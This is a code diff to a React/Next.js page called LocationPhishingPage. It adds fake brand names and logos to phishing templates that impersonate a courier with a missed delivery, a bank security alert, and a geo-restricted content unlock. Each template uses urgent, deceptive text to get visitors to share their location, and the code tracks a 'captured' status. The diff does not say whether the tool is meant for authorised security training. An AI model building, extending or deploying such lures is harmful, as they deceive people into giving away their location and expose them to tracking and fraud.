@@ -5,10 +5,10 @@ import { useParams } from 'next/navigation';
 import { useLogs } from '@/contexts/LogContext';
 import type { LocationData } from '@/types';
 import { Button } from '@/components/ui/button';
-import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
+import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { Card as ShadcnCard, CardContent, CardHeader, CardTitle as ShadcnCardTitle } from '@/components/ui/card';
-import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck } from 'lucide-react';
+import { MapPin, CheckCircle, AlertTriangle, ShieldAlert, Lock, Sparkles, type LucideIcon, Truck, Package, Banknote, PlayCircle, Film, FileText, Globe } from 'lucide-react'; // Added more icons
 
 interface TemplateContent {
   title: string;
@@ -16,29 +16,44 @@ interface TemplateContent {
   message: string;
   heroIcon?: LucideIcon;
   pageSpecificMessage?: string;
+  brandName?: string;
+  brandLogo?: React.ReactNode;
 }
 
 const templateContent: Record<string, TemplateContent> = {
   'package-delivery-issue': {
-    title: 'Action Required: Package Delivery Issue',
+    title: 'Resolve Package Delivery - Global Swift Logistics',
     actionText: 'Verify Delivery Address & Reschedule',
-    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery.",
+    message: "We're having trouble delivering your package. Please verify your current location to help us resolve the issue and reschedule your delivery with Global Swift Logistics.",
     pageSpecificMessage: "Our system indicates a recent delivery attempt for package #TZ78391B was unsuccessful. To ensure your package reaches you promptly, please confirm your current location. This will help us verify your address or allow you to select a nearby pickup point.",
     heroIcon: Truck,
+    brandName: "Global Swift Logistics",
+    brandLogo: <Package className="h-7 w-7 text-blue-600 mr-2" />,
   },
   'security-alert': {
-    title: 'Urgent: Account Security Action Required',
+    title: 'Security Alert - SecureNet Banking',
     actionText: 'Verify Location & Secure Account',
-    message: "SECURITY ALERT: Unusual Account Activity Detected",
+    message: "SECURITY ALERT: Unusual Account Activity Detected by SecureNet Banking",
     pageSpecificMessage: "We have identified suspicious activity associated with your account. To ensure your account's safety and prevent unauthorized access, please verify your current location immediately. This is a critical security measure. Your prompt attention is appreciated.",
     heroIcon: ShieldAlert,
+    brandName: "SecureNet Banking",
+    brandLogo: <Banknote className="h-7 w-7 text-green-600 mr-2" />,
   },
   'content-unlock': {
-    title: 'Unlock Exclusive Local Content',
+    title: 'Unlock Geo-Restricted Content - RegionFree Access',
     actionText: 'Verify Location to Access',
-    message: 'this content is blocked in some areas.',
+    message: 'This content is blocked in some areas. Verify with RegionFree Access.',
     pageSpecificMessage: "Access videos, images, novels, and other files that are restricted in certain countries. Share your location to confirm you reside in a region where this content is available and not blocked.",
     heroIcon: Lock,
+    brandName: "RegionFree Access",
+    brandLogo: (
+      <div className="flex items-center">
+        <PlayCircle className="h-5 w-5 text-red-500 mr-1" />
+        <Film className="h-5 w-5 text-blue-500 mr-1" />
+        <FileText className="h-5 w-5 text-gray-500 mr-2" />
+        <Globe className="h-6 w-6 text-teal-500 mr-1" />
+      </div>
+    ),
   },
   default: {
     title: 'Location Verification Needed',
@@ -144,16 +159,25 @@ export default function LocationPhishingPage() {
 
   const renderTemplateSpecificContent = () => {
     const HeroIcon = content.heroIcon || MapPin;
-    switch (templateId) {
-      case 'package-delivery-issue': {
-        return (
+    return (
+      <div className="space-y-4">
+        {content.brandLogo && (
+          <div className="flex items-center justify-center text-xl font-semibold text-gray-700 mb-3">
+            {content.brandLogo}
+            <span>{content.brandName}</span>
+          </div>
+        )}
+        {/* The main title is now handled by PhishingPageLayout, this h1 is for specific page sections if needed or can be removed */}
+        {/* <h1 className="text-2xl font-bold text-center mb-2">{content.title}</h1> */}
+
+        {templateId === 'package-delivery-issue' && (
           <div className="space-y-6 text-center">
             <HeroIcon className="w-20 h-20 text-primary mx-auto mb-4" />
             <p className="text-xl text-muted-foreground leading-relaxed">
               {content.message}
             </p>
             <ShadcnCard className="text-left bg-secondary/20 shadow-sm p-4 sm:p-6">
-             <CardHeader className="p-0 mb-3">
+              <CardHeader className="p-0 mb-3">
                 <ShadcnCardTitle className="text-lg font-semibold text-foreground">Package Status Update:</ShadcnCardTitle>
               </CardHeader>
               <CardContent className="p-0">
@@ -176,14 +200,12 @@ export default function LocationPhishingPage() {
               {content.pageSpecificMessage}
             </p>
           </div>
-        );
-      }
-      case 'security-alert': {
-        const CurrentHeroIcon = content.heroIcon || ShieldAlert;
-        return (
+        )}
+
+        {templateId === 'security-alert' && (
           <Alert variant="destructive" className="mb-6 text-left p-6 shadow-xl border-2 border-destructive-foreground/30">
             <div className="flex items-center mb-4">
-              <CurrentHeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
+              <HeroIcon className="h-12 w-12 mr-4 text-destructive flex-shrink-0" />
               <AlertTitle className="text-3xl font-bold text-destructive">
                 {content.message}
               </AlertTitle>
@@ -205,10 +227,9 @@ export default function LocationPhishingPage() {
               </div>
             </AlertDescription>
           </Alert>
-        );
-      }
-      case 'content-unlock':
-        return (
+        )}
+
+        {templateId === 'content-unlock' && (
           <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
             <CardContent className="space-y-4">
               <HeroIcon className="w-20 h-20 text-primary/60 mx-auto" />
@@ -216,23 +237,24 @@ export default function LocationPhishingPage() {
               <p className="text-md text-muted-foreground">{content.pageSpecificMessage}</p>
             </CardContent>
           </ShadcnCard>
-        );
-      default:
-        return (
-          <div className="text-center space-y-4">
+        )}
+
+        {templateId === 'default' && (
+           <div className="text-center space-y-4">
             <HeroIcon className="w-16 h-16 text-primary mx-auto" />
             <p className="text-xl text-muted-foreground">{content.message}</p>
           </div>
-        );
-    }
+        )}
+      </div>
+    );
   };
 
   return (
     <PhishingPageLayout
-        title={templateId === 'package-delivery-issue' || templateId === 'security-alert' ? '' : content.title}
-        isLoading={isLoading && status !== 'captured'}
-        error={error}
-        statusMessage={statusMessage}
+        title={content.title} // Always pass content.title
+        // isLoading={isLoading && status !== 'captured'} // Removed
+        // error={error} // Removed
+        // statusMessage={statusMessage} // Removed
     >
       <div className="space-y-6">
         {renderTemplateSpecificContent()}
